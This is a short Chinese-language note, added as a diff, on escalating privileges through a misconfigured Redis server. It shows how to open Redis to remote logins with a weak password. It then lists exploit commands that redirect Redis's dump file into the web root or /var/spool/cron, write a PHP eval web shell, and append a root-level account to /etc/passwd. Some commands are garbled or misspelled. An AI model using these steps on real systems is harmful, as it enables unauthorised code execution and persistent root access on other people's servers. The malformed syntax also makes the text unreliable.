@@ -1,0 +1,21 @@
+redis提权
+
+1、配置：
+  redis开启远程登录，redis.conf配置文件，查找bind，注释掉 bind 127.0.0.1
+  查找protected -mode yes 修改为 no
+  设置密码：requirepass 12345
+  重启redis
+  登录redis   redis-cli -h 192.0.0.1 -p 6379 -a 12345
+
+2、原理：
+  redis如果是root账户启动，可以通过root权限，写文件到硬盘
+  redis定时向硬盘中写入数据，通过设置目录，直接向特定文件写入shell
+  写入定时任务，定时任务执行写入shell
+  
+
+3、利用方式：
+config set dir /tmp        /var/spool/cron
+config set dbfilename shell.php    root
+set mm "<?php eval($_POST['code']);?>"    "\r\n */1**** echo "asdawdawda" :/root/bin/bash\r\n >> /etc/passwd"    //直接向passwd中写账户文件，可以查下一具体用法，内容是用户的密码，和权限设置uid为0，对应root用户权限
+svae
+
